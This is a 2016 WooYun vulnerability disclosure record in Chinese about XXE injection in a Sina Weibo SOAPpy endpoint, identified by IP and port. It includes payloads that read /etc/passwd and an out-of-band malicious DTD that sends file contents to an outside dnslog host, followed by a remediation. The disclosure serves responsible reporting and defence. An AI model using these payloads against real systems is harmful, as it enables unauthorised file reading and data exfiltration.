{"id": 88439, "wybug_id": "wooyun-2016-0210611", "wybug_title": "新浪微博某处SOAP接口外部实体注入                                      ", "wybug_corp": "新浪微博", "wybug_author": "sanwenkit", "wybug_date": "2016-05-19 18:42", "wybug_open_date": "2016-07-07 11:20", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-05-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-05-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-06-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-06-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-06-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-07-07：\t细节向公众公开  简要描述： SOAPpy 详细说明：  新浪微博某主机的8089端口跑着SOAP服务接口\nhttp://123.126.42.32:8089//\n为证明是新浪微博的机器，可以看它的80和8000端口\n\n\n\n从8089端口的Banner可以看到运行了SOAPpy（某个python实现的SOAP调用框架）\n\n   漏洞证明：  利用cloudeye验证是否存在XML外部实体注入POST提交PAYLOAD\n<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE dtochkx [  <!ENTITY % dtd SYSTEM \"http://xml.66ae2b.dnslog.info/verify\">%dtd;]><xxe>&dtochkx;</xxe>\n\n\n访问日志如下，证明解析了外部实体，XXE存在：\n\n继续尝试进一步利用，找了SOAPpy <= 0.12.5的文件读取exp测试提交PAYLOAD如下：\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>  <!DOCTYPE v1 [   <!ENTITY xxe SYSTEM \"file:///etc/passwd\">  ]>  <SOAP-ENV:Envelope    SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"    xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\"    xmlns:xsi=\"http://www.w3.org/1999/XMLSchema-instance\"    xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\"    xmlns:xsd=\"http://www.w3.org/1999/XMLSchema\">  <SOAP-ENV:Body>  <echo SOAP-ENC:root=\"1\">  <v1 xsi:type=\"xsd:string\">&xxe;</v1>  </echo>  </SOAP-ENV:Body>  </SOAP-ENV:Envelope>\n返回结果如下：\n\n看样子是出错了，尝试换一种payload利用cloudeye读取文件\n<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE dtochkx [  <!ENTITY % payload SYSTEM \"/proc/sys/kernel/hostname\">  <!ENTITY % dtd SYSTEM \"http://*.*.*.*:8080/xml/evil.dtd\">%dtd;%send;]><xxe>&dtochkx;</xxe>\n其中evil.dtd为自己放在公网的一个恶意DTD,内容如下：\n<?xml version=\"1.0\" encoding=\"UTF-8\"?><!ENTITY % all \"<!ENTITY &#x25; send SYSTEM 'http://66ae2b.dnslog.info/?%payload;'>\">%all;\nPAYLOAD目的是读取/proc/sys/kernel/hostname的值，但是测试发现读不到东西\n\n看来文件读取是做不到了，以上。   修复方案：  Python：from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))   版权声明：转载请注明来源 sanwenkit@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2016-05-23 11:13 厂商回复： 感谢关注新浪安全，安全问题修复中。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-05-20 12:51 |    \t\t放逐 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 白帽子放逐Gg？得失乐与悲与Av Qq205655539)\t\t \n  QWQ    \n     2016-05-20 13:33 |    \t\t荒废的腰子 \t\t\t( 普通白帽子  |\t\t\t        Rank:273 漏洞数:34        | bug is my best friend)\t\t \n  cool    \n     2016-05-27 10:40 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:5402 漏洞数:417        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  关注一下，学习    \n     2016-06-04 10:58 |    \t\tsanwenkit \t\t\t( 普通白帽子  |\t\t\t        Rank:150 漏洞数:31        | 半吊子攻城师、开发狗 | 求靠谱团队收留)\t\t \n  今天才发现 @猪猪侠 大大居然关注了，泪流满面~~    \n     2016-06-04 11:02 |    \t\tsanwenkit \t\t\t( 普通白帽子  |\t\t\t        Rank:150 漏洞数:31        | 半吊子攻城师、开发狗 | 求靠谱团队收留)\t\t \n  @猪猪侠 CVE-2014-3242（SOAPpy<= 0.12.5 XXE）    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}